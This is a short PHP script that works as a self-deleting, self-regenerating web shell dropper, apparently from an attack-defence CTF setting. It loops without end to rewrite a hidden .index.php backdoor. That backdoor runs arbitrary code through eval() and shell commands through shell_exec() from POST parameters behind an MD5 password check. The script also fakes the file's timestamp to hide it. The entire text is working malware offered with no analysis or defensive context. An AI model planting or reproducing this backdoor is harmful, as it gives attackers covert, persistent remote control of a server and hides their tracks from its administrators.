<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = './.index.php';

    
$code='<?phpif(md5($_POST["pass"])=="495db1f6f1d1eab24a79824060e7cbd7"){eval($_POST[a]);if($_POST["shell"]){echo $_POST["shell"];$opcode = $_POST["shell"];$out=shell_exec($opcode);var_dump($out);}}else{echo "error passwd";}?>';
while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2019-8-24 15:20:54" .index.php');
        usleep(50000);
}
?>
